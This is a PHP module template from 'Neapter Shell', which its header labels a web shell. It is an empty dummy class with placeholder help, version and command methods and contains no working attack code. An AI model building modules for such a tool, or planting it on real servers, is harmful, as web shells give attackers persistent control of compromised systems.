<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Create your own module
 *
 * Class must work with PHP 5.2.X!. Instead of __FILE__, __DIR__, please
 * use method $oShell->getShellFilename(), to get path of PHP shell file.
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleDummy extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @example
     * <code>
     * return array(
     *     'dummy1',
     *     'dummy2'
     * );
     * </code>
     * @return array
     */
    public static function getCommands()
    {
        return array();
    }

    /**
     * Get module version
     *
     * Please use pattern '1.0.0 2016-06-30 - <your@email.com>'
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-06-30 - <your@email.com>';
    }

    /**
     * Get module details information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Short information about module.

	Extended information

	Usage:
		command_name param1 param2

	Example:
		command_name http://google.com http://google.ru
DATA;
    }

    /**
     * Execute module
     *
     * You can use $this->oUtils and $this->oArgs to get specified parameters
     *
     * @return string
     */
    public function get()
    {
        return null;
    }

}
